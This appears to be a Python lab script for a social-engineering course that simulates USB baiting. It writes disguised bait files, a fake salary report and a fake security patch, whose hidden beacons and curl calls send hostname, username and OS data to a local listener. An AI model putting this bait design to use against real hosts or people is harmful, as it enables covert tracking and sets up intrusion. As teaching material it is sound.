#!/usr/bin/env python3
"""
=============================================================================
  LAB 4 - TOOL A: USB Baiting Canary Token Simulator
=============================================================================
  Course : Cybersecurity - Lecture 6: Social Engineering (Slide 39)
  Purpose: Simulates a "baiting" USB drop attack. A harmless file is placed
           that, when opened, phones home to a local listener to demonstrate
           how attackers track bait execution.
  
  Usage  :
    Terminal 1 (Listener): python canary_usb_simulator.py --listen
    Terminal 2 (Trigger) : python canary_usb_simulator.py --trigger
    
    Or all-in-one demo:   python canary_usb_simulator.py --demo
=============================================================================
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading
import datetime
import platform
import getpass
import socket
import json
import sys
import os
import urllib.request

LISTENER_PORT = 9000
LISTENER_HOST = "127.0.0.1"
LOG_FILE = "canary_trigger_log.json"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# THE CANARY TOKEN LISTENER (Attacker's callback server)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ALERT_PAGE = """<!DOCTYPE html>
<html><head><title>Canary Alert</title>
<style>
    body {{ font-family: Arial; background: #1a1a2e; color: #e94560;
           text-align: center; padding: 40px; }}
    .alert {{ background: #16213e; padding: 30px; border-radius: 10px;
              border: 2px solid #e94560; max-width: 700px; margin: 0 auto; }}
    .info {{ background: #0f3460; padding: 15px; border-radius: 5px;
             font-family: monospace; text-align: left; color: #a8d8ea; margin: 15px 0; }}
    .lesson {{ color: #e8e8e8; text-align: left; line-height: 1.8; }}
</style></head>
<body>
<div class="alert">
    <h1>🪤 CANARY TOKEN TRIGGERED!</h1>
    <p style="color: #ffd700; font-size: 18px;">
        The bait file "<b>{filename}</b>" was just opened.
    </p>
    <div class="info">
        <p>📋 <b>Information Captured:</b></p>
        <p>  Timestamp  : {timestamp}</p>
        <p>  Hostname   : {hostname}</p>
        <p>  Username   : {username}</p>
        <p>  OS         : {os_info}</p>
        <p>  IP Address : {ip}</p>
        <p>  User-Agent : {user_agent}</p>
    </div>
    <div class="lesson">
        <h3 style="color: #00d2ff;">📚 What Just Happened (Lecture Slide 39 — Baiting):</h3>
        <p>1. An attacker left a USB drive with an enticing file name
           (e.g., "Salary_Bonus_2025.xlsx", "Exam_Answers.pdf")</p>
        <p>2. A curious employee/student picked it up and opened the file</p>
        <p>3. The file contained a hidden callback (canary token) that
           "phoned home" to the attacker's server</p>
        <p>4. The attacker now knows: WHO opened it, WHEN, from WHERE,
           and on WHAT system</p>
        <p>5. In a real attack, the file could also: install malware,
           steal credentials, establish a reverse shell, or encrypt files (ransomware)</p>
        <br/>
        <h3 style="color: #00d2ff;">🛡️ Defenses:</h3>
        <p>✅ Never plug unknown USB devices into your computer</p>
        <p>✅ Use USB device control policies (group policy / MDM)</p>
        <p>✅ Enable autorun protection</p>
        <p>✅ Conduct periodic USB drop awareness training</p>
        <p>✅ Use USB honeypots / canary tokens for detection</p>
    </div>
</div>
</body></html>"""


class CanaryListenerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        
        filename = params.get('file', ['unknown_bait'])[0]
        hostname = params.get('host', ['unknown'])[0]
        username = params.get('user', ['unknown'])[0]
        os_info = params.get('os', ['unknown'])[0]
        timestamp = datetime.datetime.now().isoformat()
        ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'unknown')
        
        # Log the trigger
        entry = {
            "timestamp": timestamp,
            "filename": filename,
            "hostname": hostname,
            "username": username,
            "os": os_info,
            "ip": ip,
            "user_agent": user_agent
        }
        
        with open(LOG_FILE, 'a') as f:
            f.write(json.dumps(entry) + "\n")
        
        print(f"\n  {'='*60}")
        print(f"  🪤 CANARY TRIGGERED!")
        print(f"  {'='*60}")
        print(f"  File opened : {filename}")
        print(f"  Time        : {timestamp}")
        print(f"  Host        : {hostname}")
        print(f"  User        : {username}")
        print(f"  OS          : {os_info}")
        print(f"  IP          : {ip}")
        print(f"  User-Agent  : {user_agent}")
        print(f"  {'='*60}\n")
        
        # Send educational alert page
        page = ALERT_PAGE.format(
            filename=filename,
            timestamp=timestamp,
            hostname=hostname,
            username=username,
            os_info=os_info,
            ip=ip,
            user_agent=user_agent
        )
        
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(page.encode())
    
    def log_message(self, fmt, *args):
        pass


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BAIT FILE GENERATOR
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def generate_bait_files():
    """Generate harmless bait files that phone home when opened."""
    
    bait_dir = "USB_DRIVE_SIMULATION"
    os.makedirs(bait_dir, exist_ok=True)
    
    hostname = socket.gethostname()
    username = getpass.getuser()
    os_info = f"{platform.system()} {platform.release()}"
    
    # Bait 1: HTML file disguised as an important document
    html_bait = f"""<!DOCTYPE html>
<html><head><title>Salary Bonus Report 2025</title></head>
<body>
<h1>Loading Salary Report...</h1>
<p>Please wait while the document loads...</p>
<img src="http://{LISTENER_HOST}:{LISTENER_PORT}/canary?file=Salary_Bonus_2025.html&host={hostname}&user={username}&os={os_info}" width="1" height="1" style="display:none">
<script>
// This hidden request phones home to the attacker
fetch('http://{LISTENER_HOST}:{LISTENER_PORT}/canary?file=Salary_Bonus_2025.html&host={hostname}&user={username}&os={os_info}')
.then(() => {{
    document.body.innerHTML = '<div style="text-align:center;padding:50px;">' +
        '<h1 style="color:red;">🪤 CANARY TOKEN TRIGGERED!</h1>' +
        '<p>This was a bait file. Check the listener terminal for captured data.</p>' +
        '<p>See <a href="http://{LISTENER_HOST}:{LISTENER_PORT}/canary?file=Salary_Bonus_2025.html&host={hostname}&user={username}&os={os_info}">the alert page</a> for the full educational breakdown.</p></div>';
}});
</script>
</body></html>"""
    
    with open(os.path.join(bait_dir, "Salary_Bonus_2025.html"), 'w') as f:
        f.write(html_bait)
    
    # Bait 2: A batch/shell script disguised as an update
    if platform.system() == 'Windows':
        script_bait = f"""@echo off
echo ============================================
echo   Installing Critical Security Update...
echo ============================================
echo.
echo [CANARY] This is a LAB SIMULATION.
echo [CANARY] In a real attack, this script could install malware.
echo.
echo Phoning home to attacker's server...
curl -s "http://{LISTENER_HOST}:{LISTENER_PORT}/canary?file=Critical_Security_Patch.bat&host=%COMPUTERNAME%&user=%USERNAME%&os=Windows" > nul 2>&1
echo.
echo ============================================
echo   BAIT TRIGGERED! Check the listener.
echo ============================================
pause
"""
        with open(os.path.join(bait_dir, "Critical_Security_Patch.bat"), 'w') as f:
            f.write(script_bait)
    else:
        script_bait = f"""#!/bin/bash
echo "============================================"
echo "  Installing Critical Security Update..."
echo "============================================"
echo ""
echo "[CANARY] This is a LAB SIMULATION."
echo "[CANARY] In a real attack, this script could install malware."
echo ""
curl -s "http://{LISTENER_HOST}:{LISTENER_PORT}/canary?file=Critical_Security_Patch.sh&host=$(hostname)&user=$(whoami)&os=$(uname -s)" > /dev/null 2>&1
echo ""
echo "============================================"
echo "  BAIT TRIGGERED! Check the listener."
echo "============================================"
"""
        script_path = os.path.join(bait_dir, "Critical_Security_Patch.sh")
        with open(script_path, 'w') as f:
            f.write(script_bait)
        os.chmod(script_path, 0o755)
    
    # Bait 3: README to explain the USB contents
    readme = """
╔═══════════════════════════════════════════════════╗
║           FOUND USB DRIVE — CONFIDENTIAL          ║
╠═══════════════════════════════════════════════════╣
║                                                   ║
║  Contents:                                        ║
║    📄 Salary_Bonus_2025.html                      ║
║    🔧 Critical_Security_Patch.bat/.sh             ║
║                                                   ║
║  If found, please return to:                      ║
║  HR Department, 3rd Floor, Room 312               ║
║                                                   ║
╚═══════════════════════════════════════════════════╝

[LAB NOTE: This simulates what an attacker's USB drop
 would look like. The enticing file names trigger
 curiosity — one of the 7 psychological triggers.]
"""
    with open(os.path.join(bait_dir, "README.txt"), 'w') as f:
        f.write(readme)
    
    return bait_dir


def run_listener():
    """Start the canary token listener server."""
    print("=" * 65)
    print("  🪤 CANARY TOKEN LISTENER — Waiting for bait triggers...")
    print("=" * 65)
    print(f"  Listening on: http://{LISTENER_HOST}:{LISTENER_PORT}")
    print(f"  Log file    : {os.path.abspath(LOG_FILE)}")
    print(f"  Press Ctrl+C to stop.\n")
    
    server = HTTPServer((LISTENER_HOST, LISTENER_PORT), CanaryListenerHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n  Listener stopped.")
        server.server_close()


def trigger_canary():
    """Simulate opening a bait file (trigger the canary)."""
    hostname = socket.gethostname()
    username = getpass.getuser()
    os_info = f"{platform.system()}_{platform.release()}"
    
    url = (f"http://{LISTENER_HOST}:{LISTENER_PORT}/canary?"
           f"file=Salary_Bonus_2025.xlsx&host={hostname}&user={username}&os={os_info}")
    
    print(f"\n  📂 Simulating: Employee opens 'Salary_Bonus_2025.xlsx' from USB...")
    print(f"  📡 Sending canary callback to {LISTENER_HOST}:{LISTENER_PORT}...\n")
    
    try:
        urllib.request.urlopen(url, timeout=5)
        print("  ✅ Canary triggered! Check the listener terminal.\n")
    except Exception as e:
        print(f"  ❌ Could not reach listener: {e}")
        print(f"  Make sure the listener is running: python canary_usb_simulator.py --listen\n")


def run_demo():
    """All-in-one demo: start listener, generate bait files, trigger canary."""
    print("=" * 65)
    print("  🪤 USB BAITING LAB — FULL DEMO")
    print("  Lecture 6: Slide 39 (Baiting)")
    print("=" * 65)
    
    # Generate bait files
    bait_dir = generate_bait_files()
    print(f"\n  📁 Bait files generated in: {os.path.abspath(bait_dir)}/")
    print(f"     • Salary_Bonus_2025.html")
    print(f"     • Critical_Security_Patch.{'bat' if platform.system() == 'Windows' else 'sh'}")
    print(f"     • README.txt")
    
    # Start listener in background
    server = HTTPServer((LISTENER_HOST, LISTENER_PORT), CanaryListenerHandler)
    listener_thread = threading.Thread(target=server.serve_forever, daemon=True)
    listener_thread.start()
    print(f"\n  📡 Canary listener started on {LISTENER_HOST}:{LISTENER_PORT}")
    
    print(f"\n  📋 EXERCISE:")
    print(f"  1. Open the file: {os.path.abspath(bait_dir)}/Salary_Bonus_2025.html")
    print(f"     in your browser to trigger the canary")
    print(f"  2. Watch this terminal for the alert")
    print(f"  3. Or run: python canary_usb_simulator.py --trigger")
    print(f"\n  Press Ctrl+C to stop.\n")
    
    try:
        listener_thread.join()
    except KeyboardInterrupt:
        print("\n  Demo stopped.")
        server.server_close()


def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python canary_usb_simulator.py --demo      (full demo)")
        print("  python canary_usb_simulator.py --listen    (start listener)")
        print("  python canary_usb_simulator.py --trigger   (trigger canary)")
        print("  python canary_usb_simulator.py --generate  (create bait files)")
        sys.exit(1)
    
    cmd = sys.argv[1]
    if cmd == '--demo':
        run_demo()
    elif cmd == '--listen':
        run_listener()
    elif cmd == '--trigger':
        trigger_canary()
    elif cmd == '--generate':
        bait_dir = generate_bait_files()
        print(f"Bait files created in: {os.path.abspath(bait_dir)}/")
    else:
        print(f"Unknown option: {cmd}")
        sys.exit(1)


if __name__ == '__main__':
    main()
